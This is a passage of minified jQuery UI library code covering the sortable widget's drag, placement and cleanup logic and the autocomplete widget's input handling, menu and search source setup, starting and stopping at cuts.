ss("cursor",o.cursor),this.storedStylesheet=$("<style>*{ cursor: "+o.cursor+" !important; }</style>").appendTo(body)),o.opacity&&(this.helper.css("opacity")&&(this._storedOpacity=this.helper.css("opacity")),this.helper.css("opacity",o.opacity)),o.zIndex&&(this.helper.css("zIndex")&&(this._storedZIndex=this.helper.css("zIndex")),this.helper.css("zIndex",o.zIndex)),this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName&&(this.overflowOffset=this.scrollParent.offset()),this._trigger("start",event,this._uiHash()),this._preserveHelperProportions||this._cacheHelperProportions(),!noActivation)for(i=this.containers.length-1;i>=0;i--)this.containers[i]._trigger("activate",event,this._uiHash(this));return $.ui.ddmanager&&($.ui.ddmanager.current=this),$.ui.ddmanager&&!o.dropBehaviour&&$.ui.ddmanager.prepareOffsets(this,event),this.dragging=!0,this.helper.addClass("ui-sortable-helper"),this._mouseDrag(event),!0},_mouseDrag:function(event){var i,item,itemElement,intersection,o=this.options,scrolled=!1;for(this.position=this._generatePosition(event),this.positionAbs=this._convertPositionTo("absolute"),this.lastPositionAbs||(this.lastPositionAbs=this.positionAbs),this.options.scroll&&(this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName?(this.overflowOffset.top+this.scrollParent[0].offsetHeight-event.pageY<o.scrollSensitivity?this.scrollParent[0].scrollTop=scrolled=this.scrollParent[0].scrollTop+o.scrollSpeed:event.pageY-this.overflowOffset.top<o.scrollSensitivity&&(this.scrollParent[0].scrollTop=scrolled=this.scrollParent[0].scrollTop-o.scrollSpeed),this.overflowOffset.left+this.scrollParent[0].offsetWidth-event.pageX<o.scrollSensitivity?this.scrollParent[0].scrollLeft=scrolled=this.scrollParent[0].scrollLeft+o.scrollSpeed:event.pageX-this.overflowOffset.left<o.scrollSensitivity&&(this.scrollParent[0].scrollLeft=scrolled=this.scrollParent[0].scrollLeft-o.scrollSpeed)):(event.pageY-this.document.scrollTop()<o.scrollSensitivity?scrolled=this.document.scrollTop(this.document.scrollTop()-o.scrollSpeed):this.window.height()-(event.pageY-this.document.scrollTop())<o.scrollSensitivity&&(scrolled=this.document.scrollTop(this.document.scrollTop()+o.scrollSpeed)),event.pageX-this.document.scrollLeft()<o.scrollSensitivity?scrolled=this.document.scrollLeft(this.document.scrollLeft()-o.scrollSpeed):this.window.width()-(event.pageX-this.document.scrollLeft())<o.scrollSensitivity&&(scrolled=this.document.scrollLeft(this.document.scrollLeft()+o.scrollSpeed))),!1!==scrolled&&$.ui.ddmanager&&!o.dropBehaviour&&$.ui.ddmanager.prepareOffsets(this,event)),this.positionAbs=this._convertPositionTo("absolute"),this.options.axis&&"y"===this.options.axis||(this.helper[0].style.left=this.position.left+"px"),this.options.axis&&"x"===this.options.axis||(this.helper[0].style.top=this.position.top+"px"),i=this.items.length-1;i>=0;i--)if(itemElement=(item=this.items[i]).item[0],(intersection=this._intersectsWithPointer(item))&&item.instance===this.currentContainer&&!(itemElement===this.currentItem[0]||this.placeholder[1===intersection?"next":"prev"]()[0]===itemElement||$.contains(this.placeholder[0],itemElement)||"semi-dynamic"===this.options.type&&$.contains(this.element[0],itemElement))){if(this.direction=1===intersection?"down":"up","pointer"!==this.options.tolerance&&!this._intersectsWithSides(item))break;this._rearrange(event,item),this._trigger("change",event,this._uiHash());break}return this._contactContainers(event),$.ui.ddmanager&&$.ui.ddmanager.drag(this,event),this._trigger("sort",event,this._uiHash()),this.lastPositionAbs=this.positionAbs,!1},_mouseStop:function(event,noPropagation){if(event){if($.ui.ddmanager&&!this.options.dropBehaviour&&$.ui.ddmanager.drop(this,event),this.options.revert){var that=this,cur=this.placeholder.offset(),axis=this.options.axis,animation={};axis&&"x"!==axis||(animation.left=cur.left-this.offset.parent.left-this.margins.left+(this.offsetParent[0]===this.document[0].body?0:this.offsetParent[0].scrollLeft)),axis&&"y"!==axis||(animation.top=cur.top-this.offset.parent.top-this.margins.top+(this.offsetParent[0]===this.document[0].body?0:this.offsetParent[0].scrollTop)),this.reverting=!0,$(this.helper).animate(animation,parseInt(this.options.revert,10)||500,(function(){that._clear(event)}))}else this._clear(event,noPropagation);return!1}},cancel:function(){if(this.dragging){this._mouseUp({target:null}),"original"===this.options.helper?this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper"):this.currentItem.show();for(var i=this.containers.length-1;i>=0;i--)this.containers[i]._trigger("deactivate",null,this._uiHash(this)),this.containers[i].containerCache.over&&(this.containers[i]._trigger("out",null,this._uiHash(this)),this.containers[i].containerCache.over=0)}return this.placeholder&&(this.placeholder[0].parentNode&&this.placeholder[0].parentNode.removeChild(this.placeholder[0]),"original"!==this.options.helper&&this.helper&&this.helper[0].parentNode&&this.helper.remove(),$.extend(this,{helper:null,dragging:!1,reverting:!1,_noFinalSort:null}),this.domPosition.prev?$(this.domPosition.prev).after(this.currentItem):$(this.domPosition.parent).prepend(this.currentItem)),this},serialize:function(o){var items=this._getItemsAsjQuery(o&&o.connected),str=[];return o=o||{},$(items).each((function(){var res=($(o.item||this).attr(o.attribute||"id")||"").match(o.expression||/(.+)[\-=_](.+)/);res&&str.push((o.key||res[1]+"[]")+"="+(o.key&&o.expression?res[1]:res[2]))})),!str.length&&o.key&&str.push(o.key+"="),str.join("&")},toArray:function(o){var items=this._getItemsAsjQuery(o&&o.connected),ret=[];return o=o||{},items.each((function(){ret.push($(o.item||this).attr(o.attribute||"id")||"")})),ret},_intersectsWith:function(item){var x1=this.positionAbs.left,x2=x1+this.helperProportions.width,y1=this.positionAbs.top,y2=y1+this.helperProportions.height,l=item.left,r=l+item.width,t=item.top,b=t+item.height,dyClick=this.offset.click.top,dxClick=this.offset.click.left,isOverElementHeight="x"===this.options.axis||y1+dyClick>t&&y1+dyClick<b,isOverElementWidth="y"===this.options.axis||x1+dxClick>l&&x1+dxClick<r,isOverElement=isOverElementHeight&&isOverElementWidth;return"pointer"===this.options.tolerance||this.options.forcePointerForContainers||"pointer"!==this.options.tolerance&&this.helperProportions[this.floating?"width":"height"]>item[this.floating?"width":"height"]?isOverElement:l<x1+this.helperProportions.width/2&&x2-this.helperProportions.width/2<r&&t<y1+this.helperProportions.height/2&&y2-this.helperProportions.height/2<b},_intersectsWithPointer:function(item){var isOverElementHeight="x"===this.options.axis||this._isOverAxis(this.positionAbs.top+this.offset.click.top,item.top,item.height),isOverElementWidth="y"===this.options.axis||this._isOverAxis(this.positionAbs.left+this.offset.click.left,item.left,item.width),isOverElement=isOverElementHeight&&isOverElementWidth,verticalDirection=this._getDragVerticalDirection(),horizontalDirection=this._getDragHorizontalDirection();return!!isOverElement&&(this.floating?horizontalDirection&&"right"===horizontalDirection||"down"===verticalDirection?2:1:verticalDirection&&("down"===verticalDirection?2:1))},_intersectsWithSides:function(item){var isOverBottomHalf=this._isOverAxis(this.positionAbs.top+this.offset.click.top,item.top+item.height/2,item.height),isOverRightHalf=this._isOverAxis(this.positionAbs.left+this.offset.click.left,item.left+item.width/2,item.width),verticalDirection=this._getDragVerticalDirection(),horizontalDirection=this._getDragHorizontalDirection();return this.floating&&horizontalDirection?"right"===horizontalDirection&&isOverRightHalf||"left"===horizontalDirection&&!isOverRightHalf:verticalDirection&&("down"===verticalDirection&&isOverBottomHalf||"up"===verticalDirection&&!isOverBottomHalf)},_getDragVerticalDirection:function(){var delta=this.positionAbs.top-this.lastPositionAbs.top;return 0!==delta&&(delta>0?"down":"up")},_getDragHorizontalDirection:function(){var delta=this.positionAbs.left-this.lastPositionAbs.left;return 0!==delta&&(delta>0?"right":"left")},refresh:function(event){return this._refreshItems(event),this._setHandleClassName(),this.refreshPositions(),this},_connectWith:function(){var options=this.options;return options.connectWith.constructor===String?[options.connectWith]:options.connectWith},_getItemsAsjQuery:function(connected){var i,j,cur,inst,items=[],queries=[],connectWith=this._connectWith();if(connectWith&&connected)for(i=connectWith.length-1;i>=0;i--)for(j=(cur=$(connectWith[i],this.document[0])).length-1;j>=0;j--)(inst=$.data(cur[j],this.widgetFullName))&&inst!==this&&!inst.options.disabled&&queries.push([$.isFunction(inst.options.items)?inst.options.items.call(inst.element):$(inst.options.items,inst.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),inst]);function addItems(){items.push(this)}for(queries.push([$.isFunction(this.options.items)?this.options.items.call(this.element,null,{options:this.options,item:this.currentItem}):$(this.options.items,this.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),this]),i=queries.length-1;i>=0;i--)queries[i][0].each(addItems);return $(items)},_removeCurrentsFromItems:function(){var list=this.currentItem.find(":data("+this.widgetName+"-item)");this.items=$.grep(this.items,(function(item){for(var j=0;j<list.length;j++)if(list[j]===item.item[0])return!1;return!0}))},_refreshItems:function(event){this.items=[],this.containers=[this];var i,j,cur,inst,targetData,_queries,item,queriesLength,items=this.items,queries=[[$.isFunction(this.options.items)?this.options.items.call(this.element[0],event,{item:this.currentItem}):$(this.options.items,this.element),this]],connectWith=this._connectWith();if(connectWith&&this.ready)for(i=connectWith.length-1;i>=0;i--)for(j=(cur=$(connectWith[i],this.document[0])).length-1;j>=0;j--)(inst=$.data(cur[j],this.widgetFullName))&&inst!==this&&!inst.options.disabled&&(queries.push([$.isFunction(inst.options.items)?inst.options.items.call(inst.element[0],event,{item:this.currentItem}):$(inst.options.items,inst.element),inst]),this.containers.push(inst));for(i=queries.length-1;i>=0;i--)for(targetData=queries[i][1],j=0,queriesLength=(_queries=queries[i][0]).length;j<queriesLength;j++)(item=$(_queries[j])).data(this.widgetName+"-item",targetData),items.push({item:item,instance:targetData,width:0,height:0,left:0,top:0})},refreshPositions:function(fast){var i,item,t,p;for(this.floating=!!this.items.length&&("x"===this.options.axis||this._isFloating(this.items[0].item)),this.offsetParent&&this.helper&&(this.offset.parent=this._getParentOffset()),i=this.items.length-1;i>=0;i--)(item=this.items[i]).instance!==this.currentContainer&&this.currentContainer&&item.item[0]!==this.currentItem[0]||(t=this.options.toleranceElement?$(this.options.toleranceElement,item.item):item.item,fast||(item.width=t.outerWidth(),item.height=t.outerHeight()),p=t.offset(),item.left=p.left,item.top=p.top);if(this.options.custom&&this.options.custom.refreshContainers)this.options.custom.refreshContainers.call(this);else for(i=this.containers.length-1;i>=0;i--)p=this.containers[i].element.offset(),this.containers[i].containerCache.left=p.left,this.containers[i].containerCache.top=p.top,this.containers[i].containerCache.width=this.containers[i].element.outerWidth(),this.containers[i].containerCache.height=this.containers[i].element.outerHeight();return this},_createPlaceholder:function(that){var className,o=(that=that||this).options;o.placeholder&&o.placeholder.constructor!==String||(className=o.placeholder,o.placeholder={element:function(){var nodeName=that.currentItem[0].nodeName.toLowerCase(),element=$("<"+nodeName+">",that.document[0]).addClass(className||that.currentItem[0].className+" ui-sortable-placeholder").removeClass("ui-sortable-helper");return"tbody"===nodeName?that._createTrPlaceholder(that.currentItem.find("tr").eq(0),$("<tr>",that.document[0]).appendTo(element)):"tr"===nodeName?that._createTrPlaceholder(that.currentItem,element):"img"===nodeName&&element.attr("src",that.currentItem.attr("src")),className||element.css("visibility","hidden"),element},update:function(container,p){className&&!o.forcePlaceholderSize||(p.height()||p.height(that.currentItem.innerHeight()-parseInt(that.currentItem.css("paddingTop")||0,10)-parseInt(that.currentItem.css("paddingBottom")||0,10)),p.width()||p.width(that.currentItem.innerWidth()-parseInt(that.currentItem.css("paddingLeft")||0,10)-parseInt(that.currentItem.css("paddingRight")||0,10)))}}),that.placeholder=$(o.placeholder.element.call(that.element,that.currentItem)),that.currentItem.after(that.placeholder),o.placeholder.update(that,that.placeholder)},_createTrPlaceholder:function(sourceTr,targetTr){var that=this;sourceTr.children().each((function(){$("<td>&#160;</td>",that.document[0]).attr("colspan",$(this).attr("colspan")||1).appendTo(targetTr)}))},_contactContainers:function(event){var i,j,dist,itemWithLeastDistance,posProperty,sizeProperty,cur,nearBottom,floating,axis,innermostContainer=null,innermostIndex=null;for(i=this.containers.length-1;i>=0;i--)if(!$.contains(this.currentItem[0],this.containers[i].element[0]))if(this._intersectsWith(this.containers[i].containerCache)){if(innermostContainer&&$.contains(this.containers[i].element[0],innermostContainer.element[0]))continue;innermostContainer=this.containers[i],innermostIndex=i}else this.containers[i].containerCache.over&&(this.containers[i]._trigger("out",event,this._uiHash(this)),this.containers[i].containerCache.over=0);if(innermostContainer)if(1===this.containers.length)this.containers[innermostIndex].containerCache.over||(this.containers[innermostIndex]._trigger("over",event,this._uiHash(this)),this.containers[innermostIndex].containerCache.over=1);else{for(dist=1e4,itemWithLeastDistance=null,posProperty=(floating=innermostContainer.floating||this._isFloating(this.currentItem))?"left":"top",sizeProperty=floating?"width":"height",axis=floating?"clientX":"clientY",j=this.items.length-1;j>=0;j--)$.contains(this.containers[innermostIndex].element[0],this.items[j].item[0])&&this.items[j].item[0]!==this.currentItem[0]&&(cur=this.items[j].item.offset()[posProperty],nearBottom=!1,event[axis]-cur>this.items[j][sizeProperty]/2&&(nearBottom=!0),Math.abs(event[axis]-cur)<dist&&(dist=Math.abs(event[axis]-cur),itemWithLeastDistance=this.items[j],this.direction=nearBottom?"up":"down"));if(!itemWithLeastDistance&&!this.options.dropOnEmpty)return;if(this.currentContainer===this.containers[innermostIndex])return void(this.currentContainer.containerCache.over||(this.containers[innermostIndex]._trigger("over",event,this._uiHash()),this.currentContainer.containerCache.over=1));itemWithLeastDistance?this._rearrange(event,itemWithLeastDistance,null,!0):this._rearrange(event,null,this.containers[innermostIndex].element,!0),this._trigger("change",event,this._uiHash()),this.containers[innermostIndex]._trigger("change",event,this._uiHash(this)),this.currentContainer=this.containers[innermostIndex],this.options.placeholder.update(this.currentContainer,this.placeholder),this.containers[innermostIndex]._trigger("over",event,this._uiHash(this)),this.containers[innermostIndex].containerCache.over=1}},_createHelper:function(event){var o=this.options,helper=$.isFunction(o.helper)?$(o.helper.apply(this.element[0],[event,this.currentItem])):"clone"===o.helper?this.currentItem.clone():this.currentItem;return helper.parents("body").length||$("parent"!==o.appendTo?o.appendTo:this.currentItem[0].parentNode)[0].appendChild(helper[0]),helper[0]===this.currentItem[0]&&(this._storedCSS={width:this.currentItem[0].style.width,height:this.currentItem[0].style.height,position:this.currentItem.css("position"),top:this.currentItem.css("top"),left:this.currentItem.css("left")}),helper[0].style.width&&!o.forceHelperSize||helper.width(this.currentItem.width()),helper[0].style.height&&!o.forceHelperSize||helper.height(this.currentItem.height()),helper},_adjustOffsetFromHelper:function(obj){"string"==typeof obj&&(obj=obj.split(" ")),$.isArray(obj)&&(obj={left:+obj[0],top:+obj[1]||0}),"left"in obj&&(this.offset.click.left=obj.left+this.margins.left),"right"in obj&&(this.offset.click.left=this.helperProportions.width-obj.right+this.margins.left),"top"in obj&&(this.offset.click.top=obj.top+this.margins.top),"bottom"in obj&&(this.offset.click.top=this.helperProportions.height-obj.bottom+this.margins.top)},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var po=this.offsetParent.offset();return"absolute"===this.cssPosition&&this.scrollParent[0]!==this.document[0]&&$.contains(this.scrollParent[0],this.offsetParent[0])&&(po.left+=this.scrollParent.scrollLeft(),po.top+=this.scrollParent.scrollTop()),(this.offsetParent[0]===this.document[0].body||this.offsetParent[0].tagName&&"html"===this.offsetParent[0].tagName.toLowerCase()&&$.ui.ie)&&(po={top:0,left:0}),{top:po.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:po.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if("relative"===this.cssPosition){var p=this.currentItem.position();return{top:p.top-(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:p.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}}return{top:0,left:0}},_cacheMargins:function(){this.margins={left:parseInt(this.currentItem.css("marginLeft"),10)||0,top:parseInt(this.currentItem.css("marginTop"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var ce,co,over,o=this.options;"parent"===o.containment&&(o.containment=this.helper[0].parentNode),"document"!==o.containment&&"window"!==o.containment||(this.containment=[0-this.offset.relative.left-this.offset.parent.left,0-this.offset.relative.top-this.offset.parent.top,"document"===o.containment?this.document.width():this.window.width()-this.helperProportions.width-this.margins.left,("document"===o.containment?this.document.width():this.window.height()||this.document[0].body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top]),/^(document|window|parent)$/.test(o.containment)||(ce=$(o.containment)[0],co=$(o.containment).offset(),over="hidden"!==$(ce).css("overflow"),this.containment=[co.left+(parseInt($(ce).css("borderLeftWidth"),10)||0)+(parseInt($(ce).css("paddingLeft"),10)||0)-this.margins.left,co.top+(parseInt($(ce).css("borderTopWidth"),10)||0)+(parseInt($(ce).css("paddingTop"),10)||0)-this.margins.top,co.left+(over?Math.max(ce.scrollWidth,ce.offsetWidth):ce.offsetWidth)-(parseInt($(ce).css("borderLeftWidth"),10)||0)-(parseInt($(ce).css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left,co.top+(over?Math.max(ce.scrollHeight,ce.offsetHeight):ce.offsetHeight)-(parseInt($(ce).css("borderTopWidth"),10)||0)-(parseInt($(ce).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top])},_convertPositionTo:function(d,pos){pos||(pos=this.position);var mod="absolute"===d?1:-1,scroll="absolute"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&$.contains(this.scrollParent[0],this.offsetParent[0])?this.scrollParent:this.offsetParent,scrollIsRootNode=/(html|body)/i.test(scroll[0].tagName);return{top:pos.top+this.offset.relative.top*mod+this.offset.parent.top*mod-("fixed"===this.cssPosition?-this.scrollParent.scrollTop():scrollIsRootNode?0:scroll.scrollTop())*mod,left:pos.left+this.offset.relative.left*mod+this.offset.parent.left*mod-("fixed"===this.cssPosition?-this.scrollParent.scrollLeft():scrollIsRootNode?0:scroll.scrollLeft())*mod}},_generatePosition:function(event){var top,left,o=this.options,pageX=event.pageX,pageY=event.pageY,scroll="absolute"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&$.contains(this.scrollParent[0],this.offsetParent[0])?this.scrollParent:this.offsetParent,scrollIsRootNode=/(html|body)/i.test(scroll[0].tagName);return"relative"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&this.scrollParent[0]!==this.offsetParent[0]||(this.offset.relative=this._getRelativeOffset()),this.originalPosition&&(this.containment&&(event.pageX-this.offset.click.left<this.containment[0]&&(pageX=this.containment[0]+this.offset.click.left),event.pageY-this.offset.click.top<this.containment[1]&&(pageY=this.containment[1]+this.offset.click.top),event.pageX-this.offset.click.left>this.containment[2]&&(pageX=this.containment[2]+this.offset.click.left),event.pageY-this.offset.click.top>this.containment[3]&&(pageY=this.containment[3]+this.offset.click.top)),o.grid&&(top=this.originalPageY+Math.round((pageY-this.originalPageY)/o.grid[1])*o.grid[1],pageY=this.containment?top-this.offset.click.top>=this.containment[1]&&top-this.offset.click.top<=this.containment[3]?top:top-this.offset.click.top>=this.containment[1]?top-o.grid[1]:top+o.grid[1]:top,left=this.originalPageX+Math.round((pageX-this.originalPageX)/o.grid[0])*o.grid[0],pageX=this.containment?left-this.offset.click.left>=this.containment[0]&&left-this.offset.click.left<=this.containment[2]?left:left-this.offset.click.left>=this.containment[0]?left-o.grid[0]:left+o.grid[0]:left)),{top:pageY-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+("fixed"===this.cssPosition?-this.scrollParent.scrollTop():scrollIsRootNode?0:scroll.scrollTop()),left:pageX-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+("fixed"===this.cssPosition?-this.scrollParent.scrollLeft():scrollIsRootNode?0:scroll.scrollLeft())}},_rearrange:function(event,i,a,hardRefresh){a?a[0].appendChild(this.placeholder[0]):i.item[0].parentNode.insertBefore(this.placeholder[0],"down"===this.direction?i.item[0]:i.item[0].nextSibling),this.counter=this.counter?++this.counter:1;var counter=this.counter;this._delay((function(){counter===this.counter&&this.refreshPositions(!hardRefresh)}))},_clear:function(event,noPropagation){this.reverting=!1;var i,delayedTriggers=[];if(!this._noFinalSort&&this.currentItem.parent().length&&this.placeholder.before(this.currentItem),this._noFinalSort=null,this.helper[0]===this.currentItem[0]){for(i in this._storedCSS)"auto"!==this._storedCSS[i]&&"static"!==this._storedCSS[i]||(this._storedCSS[i]="");this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper")}else this.currentItem.show();function delayEvent(type,instance,container){return function(event){container._trigger(type,event,instance._uiHash(instance))}}for(this.fromOutside&&!noPropagation&&delayedTriggers.push((function(event){this._trigger("receive",event,this._uiHash(this.fromOutside))})),!this.fromOutside&&this.domPosition.prev===this.currentItem.prev().not(".ui-sortable-helper")[0]&&this.domPosition.parent===this.currentItem.parent()[0]||noPropagation||delayedTriggers.push((function(event){this._trigger("update",event,this._uiHash())})),this!==this.currentContainer&&(noPropagation||(delayedTriggers.push((function(event){this._trigger("remove",event,this._uiHash())})),delayedTriggers.push(function(c){return function(event){c._trigger("receive",event,this._uiHash(this))}}.call(this,this.currentContainer)),delayedTriggers.push(function(c){return function(event){c._trigger("update",event,this._uiHash(this))}}.call(this,this.currentContainer)))),i=this.containers.length-1;i>=0;i--)noPropagation||delayedTriggers.push(delayEvent("deactivate",this,this.containers[i])),this.containers[i].containerCache.over&&(delayedTriggers.push(delayEvent("out",this,this.containers[i])),this.containers[i].containerCache.over=0);if(this.storedCursor&&(this.document.find("body").css("cursor",this.storedCursor),this.storedStylesheet.remove()),this._storedOpacity&&this.helper.css("opacity",this._storedOpacity),this._storedZIndex&&this.helper.css("zIndex","auto"===this._storedZIndex?"":this._storedZIndex),this.dragging=!1,noPropagation||this._trigger("beforeStop",event,this._uiHash()),this.placeholder[0].parentNode.removeChild(this.placeholder[0]),this.cancelHelperRemoval||(this.helper[0]!==this.currentItem[0]&&this.helper.remove(),this.helper=null),!noPropagation){for(i=0;i<delayedTriggers.length;i++)delayedTriggers[i].call(this,event);this._trigger("stop",event,this._uiHash())}return this.fromOutside=!1,!this.cancelHelperRemoval},_trigger:function(){!1===$.Widget.prototype._trigger.apply(this,arguments)&&this.cancel()},_uiHash:function(_inst){var inst=_inst||this;return{helper:inst.helper,placeholder:inst.placeholder||$([]),position:inst.position,originalPosition:inst.originalPosition,offset:inst.positionAbs,item:inst.currentItem,sender:_inst?_inst.element:null}}});$.widget("ui.autocomplete",{version:"1.11.4",defaultElement:"<input>",options:{appendTo:null,autoFocus:!1,delay:300,minLength:1,position:{my:"left top",at:"left bottom",collision:"none"},source:null,change:null,close:null,focus:null,open:null,response:null,search:null,select:null},requestIndex:0,pending:0,_create:function(){var suppressKeyPress,suppressKeyPressRepeat,suppressInput,nodeName=this.element[0].nodeName.toLowerCase(),isTextarea="textarea"===nodeName,isInput="input"===nodeName;this.isMultiLine=!!isTextarea||!isInput&&this.element.prop("isContentEditable"),this.valueMethod=this.element[isTextarea||isInput?"val":"text"],this.isNewMenu=!0,this.element.addClass("ui-autocomplete-input").attr("autocomplete","off"),this._on(this.element,{keydown:function(event){if(this.element.prop("readOnly"))return suppressKeyPress=!0,suppressInput=!0,void(suppressKeyPressRepeat=!0);suppressKeyPress=!1,suppressInput=!1,suppressKeyPressRepeat=!1;var keyCode=$.ui.keyCode;switch(event.keyCode){case keyCode.PAGE_UP:suppressKeyPress=!0,this._move("previousPage",event);break;case keyCode.PAGE_DOWN:suppressKeyPress=!0,this._move("nextPage",event);break;case keyCode.UP:suppressKeyPress=!0,this._keyEvent("previous",event);break;case keyCode.DOWN:suppressKeyPress=!0,this._keyEvent("next",event);break;case keyCode.ENTER:this.menu.active&&(suppressKeyPress=!0,event.preventDefault(),this.menu.select(event));break;case keyCode.TAB:this.menu.active&&this.menu.select(event);break;case keyCode.ESCAPE:this.menu.element.is(":visible")&&(this.isMultiLine||this._value(this.term),this.close(event),event.preventDefault());break;default:suppressKeyPressRepeat=!0,this._searchTimeout(event)}},keypress:function(event){if(suppressKeyPress)return suppressKeyPress=!1,void(this.isMultiLine&&!this.menu.element.is(":visible")||event.preventDefault());if(!suppressKeyPressRepeat){var keyCode=$.ui.keyCode;switch(event.keyCode){case keyCode.PAGE_UP:this._move("previousPage",event);break;case keyCode.PAGE_DOWN:this._move("nextPage",event);break;case keyCode.UP:this._keyEvent("previous",event);break;case keyCode.DOWN:this._keyEvent("next",event)}}},input:function(event){if(suppressInput)return suppressInput=!1,void event.preventDefault();this._searchTimeout(event)},focus:function(){this.selectedItem=null,this.previous=this._value()},blur:function(event){this.cancelBlur?delete this.cancelBlur:(clearTimeout(this.searching),this.close(event),this._change(event))}}),this._initSource(),this.menu=$("<ul>").addClass("ui-autocomplete ui-front").appendTo(this._appendTo()).menu({role:null}).hide().menu("instance"),this._on(this.menu.element,{mousedown:function(event){event.preventDefault(),this.cancelBlur=!0,this._delay((function(){delete this.cancelBlur}));var menuElement=this.menu.element[0];$(event.target).closest(".ui-menu-item").length||this._delay((function(){var that=this;this.document.one("mousedown",(function(event){event.target===that.element[0]||event.target===menuElement||$.contains(menuElement,event.target)||that.close()}))}))},menufocus:function(event,ui){var label,item;if(this.isNewMenu&&(this.isNewMenu=!1,event.originalEvent&&/^mouse/.test(event.originalEvent.type)))return this.menu.blur(),void this.document.one("mousemove",(function(){$(event.target).trigger(event.originalEvent)}));item=ui.item.data("ui-autocomplete-item"),!1!==this._trigger("focus",event,{item:item})&&event.originalEvent&&/^key/.test(event.originalEvent.type)&&this._value(item.value),(label=ui.item.attr("aria-label")||item.value)&&$.trim(label).length&&(this.liveRegion.children().hide(),$("<div>").text(label).appendTo(this.liveRegion))},menuselect:function(event,ui){var item=ui.item.data("ui-autocomplete-item"),previous=this.previous;this.element[0]!==this.document[0].activeElement&&(this.element.focus(),this.previous=previous,this._delay((function(){this.previous=previous,this.selectedItem=item}))),!1!==this._trigger("select",event,{item:item})&&this._value(item.value),this.term=this._value(),this.close(event),this.selectedItem=item}}),this.liveRegion=$("<span>",{role:"status","aria-live":"assertive","aria-relevant":"additions"}).addClass("ui-helper-hidden-accessible").appendTo(this.document[0].body),this._on(this.window,{beforeunload:function(){this.element.removeAttr("autocomplete")}})},_destroy:function(){clearTimeout(this.searching),this.element.removeClass("ui-autocomplete-input").removeAttr("autocomplete"),this.menu.element.remove(),this.liveRegion.remove()},_setOption:function(key,value){this._super(key,value),"source"===key&&this._initSource(),"appendTo"===key&&this.menu.element.appendTo(this._appendTo()),"disabled"===key&&value&&this.xhr&&this.xhr.abort()},_appendTo:function(){var element=this.options.appendTo;return element&&(element=element.jquery||element.nodeType?$(element):this.document.find(element).eq(0)),element&&element[0]||(element=this.element.closest(".ui-front")),element.length||(element=this.document[0].body),element},_initSource:function(){var array,url,that=this;$.isArray(this.options.source)?(array=this.options.source,this.source=function(request,response){response($.ui.autocomplete.filter(array,request.term))}):"string"==typeof this.options.source?(url=this.options.source,this.source=function(request,response){that.xhr&&that.xhr.abort(),that.xhr=$.ajax({url:url,data:request,dataType:"json",success:function(data){response(data)},error:function(){response([])}})}):this.source=this.options.source},_searchTimeout:function(event){clearTimeout(this.searching),this.searching=this._delay((function(){var equalValues=this.term===this._value(),menuVisible=this.menu.element.is(":visible"),modifierKey=event.altKey||event.ctrlKey||event.metaKey||event.shiftKey;equalValues&&(!equalValues||menuVisible||modifierKey)||(this.selectedItem=null,this.search(null,event))}),this.options.delay)},search:function(value,event){return value=null!=value?value:this._value(),this.term=this._value(),value.length<this.options.minLength?this.close(event):!1!==this._trigger("search",event)?this._search(value):void 0},_search:function(value){this.pending++,this.element.addClass("ui-autocomplete-loading"),this.cancelSearch=!1,this.source({term:value},this._response())},_response:function(){var index=++this.requestIndex;return $.proxy((function(content){index===this.requestIndex&&this.__response(content),this.pending--,this.pending||this.element.removeClass("ui-autocomplete-loading")}),this)},__response:function(content){content&&(content=this._normalize(content)),this._trigger("response",null,{content:content}),!this.options.disabled&&content&&content.length&&!this.cancelSearch?(this._suggest(content),this._trigger("open")):this._close()},close:function(event){this.cancelSearch=!0,this._close(event)},_close:function(event){this.menu.element.is(":visible")&&(this.menu.element.hide(),this.menu.blur(),this.isNewMenu=!0,this._trigger("close",event))},_change:function(event){this.previous!==this._value()&&this._trigger("change",event,{item:this.selectedItem})},_normalize:function(items){return items.length&&items[0].label&&items[0].value?items:$.map(items,(function(item){return"string"==typeof item?{label:item,value:item}:$.extend({},item,{label:item.label||item.value,value:item.value||item.label})}))},_suggest:function(items){var ul=this.menu.element.empty();this._renderMenu(ul,items),this.isNewMenu=!0,this.menu.refresh(),ul.show(),this._resizeMenu(),ul.position($.extend({of:this.element},this.options.position)),this.options.autoFocus&&this.menu.next()},_resizeMenu:function(){var ul=this.menu.element;ul.outerWidth(Math.max(ul.width("").outerWidth()+1,this.element.outerWidth()))},_renderMenu:function(ul,items){var that=this;$.each(items,(function(index,item){that._renderItemData(ul,item)}))},_renderItemData:function(ul,item){return this._renderItem(ul,item).data("ui-autocomplete-item",item)},_renderItem:function(ul,item){return $("<li>").text(item.label).appendTo(ul)},_move:function(direction,event){if(this.menu.element.is(":visible"))return this.menu.isFirstItem()&&/^previous/.test(direction)||this.menu.isLastItem()&&/^next/.test(direction)?(this.isMultiLine||this._value(this.term),void this.menu.blur()):void this.menu[direction](event);this.search(null,event)},widget:function(){return this.menu.element},_value:function(){return this.valueMethod.apply(this.element,arguments)},_keyEvent:function(keyEvent,event){this.isMultiLine&&!this.menu.element.is(":visible")||(this._move(keyEvent,event),event.preventDefault())}}),$.extend($.ui.autocomplete,{escapeRegex:function(value){return value.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&")},filter:function(array,term){var matcher=new RegExp($.ui.autocomplete.escapeRegex(term),"i");return $.grep(array,(function(value){return 